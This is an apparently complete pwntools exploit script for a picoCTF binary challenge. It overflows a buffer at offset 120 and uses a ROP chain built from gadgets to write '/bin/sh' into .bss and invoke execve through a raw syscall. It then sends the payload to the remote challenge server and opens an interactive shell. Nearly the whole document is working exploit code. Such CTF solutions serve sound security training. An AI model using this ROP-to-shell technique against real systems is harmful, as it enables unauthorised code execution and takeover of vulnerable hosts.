#!/bin/usr/python3
from pwn import *

context.terminal = ["tmux", "split", "-h"]
elf = context.binary = ELF("./vuln")
context.log_level = "debug"
context.delete_corefiles = True

def start():
	p = process("./vuln")
	gdb.attach(p, gdbscript ='''
		b main
		b *0x400c71
		continue
	''')
	return p

offset = 120
bss_addr = 0x6bc3a0


rop = ROP(elf)
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
#mov_rax_rsi = rop.find_gadget(["mov rax", "rsi", "ret"])[0]
#mov_rax_rsi = 0x0410b62
mov_rdi_rdx = 0x436393
syscall_addr = rop.find_gadget(["syscall", "ret"])[0]

info("pop rax = %#x", pop_rax)
info("pop rdi = %#x", pop_rdi)
info("pop rdx = %#x", pop_rdx)
info("pop rsi = %#x", pop_rsi)
#info("mov rax rsi = %#x", mov_rax_rsi)
info("mov qword ptr [rdi], rdx", mov_rdi_rdx)
info("syscall address = %#x", syscall_addr)

#rop.raw([pop_rax, bss_addr, pop_rsi, " /bin/sh", mov_rax_rsi])
# we need to remember \x00 byte to terminate the string.
# if u dont do that, your program wont work just like me
rop.raw([pop_rdx, "/bin/sh\x00", pop_rdi, bss_addr, mov_rdi_rdx])
rop.raw([pop_rdi, bss_addr, pop_rax, 59, pop_rdx, 0, pop_rsi, 0, syscall_addr])

payload = flat({
	offset: rop.chain()
})

f = open("payload", "wb")
f.write(payload)
f.close()

#p = process("./vuln")
#p = start()
p = remote("jupiter.challenges.picoctf.org", 51462)
p.sendlineafter("What number would you like to guess?", "84")
p.sendlineafter("Name?", payload)
p.interactive()




